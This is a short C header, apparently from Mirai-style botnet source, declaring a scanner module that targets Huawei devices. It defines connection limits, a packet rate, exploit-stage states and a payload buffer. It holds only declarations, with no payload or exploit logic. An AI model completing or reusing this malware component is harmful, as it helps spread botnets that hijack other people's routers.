#pragma once
#ifdef NP_TELNET
#include <stdint.h>
#include "includes.h"

#define HUAWEI_SCANNER_MAX_CONNS 128
#define HUAWEI_SCANNER_RAW_PPS   160
#define HUAWEI_SCANNER_RDBUF_SIZE 256
#define HUAWEI_SCANNER_HACK_DRAIN 64

struct huawei_scanner_connection {
	int fd, last_recv;
	enum {
		HUAWEI_SC_CLOSED,
		HUAWEI_SC_CONNECTING,
		HUAWEI_SC_EXPLOIT_STAGE2,
		HUAWEI_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[HUAWEI_SCANNER_RDBUF_SIZE];
	char payload_buf[2560];
};

void huawei_init(void);
void huawei_kill(void);
#endif
